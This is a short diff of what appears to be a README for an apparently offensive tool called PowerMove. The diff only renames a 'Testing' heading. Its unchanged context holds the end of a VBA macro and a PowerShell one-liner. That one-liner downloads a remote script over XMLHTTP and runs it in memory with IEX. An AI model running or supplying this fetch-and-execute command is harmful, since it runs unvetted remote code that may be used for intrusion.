@@ -46,7 +46,7 @@ Sub TEST()
 End Sub
 ```
 
-### Testing
+### Testing with Notepad
 ```powershell
 powershell.exe -nop -NoExit -Command ""$h=New-Object -ComObject 'Msxml2.XMLHTTP';$h.open('GET','https://raw.githubusercontent.com/10N351R/PowerMove/refs/heads/main/PowerMove_dynamic.ps1',$false);$h.send();IEX $h.responseText""
 ```
